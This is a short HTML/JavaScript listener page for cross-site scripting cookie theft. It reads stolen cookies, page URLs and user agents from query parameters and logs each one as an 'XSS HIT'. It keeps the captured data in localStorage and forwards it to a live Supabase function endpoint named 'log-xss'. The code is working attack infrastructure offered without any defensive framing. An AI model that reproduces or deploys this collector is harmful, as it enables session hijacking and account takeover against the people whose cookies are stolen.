<script>
    const logsDiv = document.getElementById('logs');
    
    // === PUT YOUR REAL SUPABASE URL HERE ===
    const BACKEND_URL = 'https://viwictbgpkifzlwltcpw.supabase.co/functions/v1/log-xss';

    function loadLogs() {
        const savedLogs = localStorage.getItem('xssLogs') || '=== Previous Logs ===\n\n';
        logsDiv.innerHTML = savedLogs;
    }

    function addLog() {
        try {
            const params = new URLSearchParams(window.location.search);
            const cookie = params.get('c') || '[NO COOKIE]';
            const url = params.get('u') || '[NO URL]';
            const time = new Date().toISOString();
            const userAgent = navigator.userAgent || '[UNKNOWN UA]';

            const newLog = `=== XSS HIT ===\nTime: ${time}\nCookie: ${cookie}\nURL: ${url}\nUser-Agent: ${userAgent}\n========================\n\n`;

            // Show locally
            logsDiv.innerHTML += newLog;
            localStorage.setItem('xssLogs', logsDiv.innerHTML);

            // Send to Supabase
            if (BACKEND_URL.includes('YOUR-PROJECT-REF') || BACKEND_URL === '') {
                logsDiv.innerHTML += 'ERROR: BACKEND_URL is not set correctly!\n';
                return;
            }

            const sendParams = new URLSearchParams({ c: cookie, u: url, ua: userAgent });

            fetch(BACKEND_URL + '?' + sendParams.toString(), {
                method: 'GET',
                mode: 'no-cors'
            }).catch(err => {
                console.error('Fetch error:', err);
                // Don't break the page
            });

            console.log(newLog);
        } catch (e) {
            console.error('addLog error:', e);
            logsDiv.innerHTML += 'JS Error: ' + e.message + '\n';
        }
    }

    // Initialize
    loadLogs();
    if (window.location.search) {
        addLog();
    } else {
        logsDiv.innerHTML += 'Listener loaded. Add ?c=...&u=... to test.\n';
    }
</script>
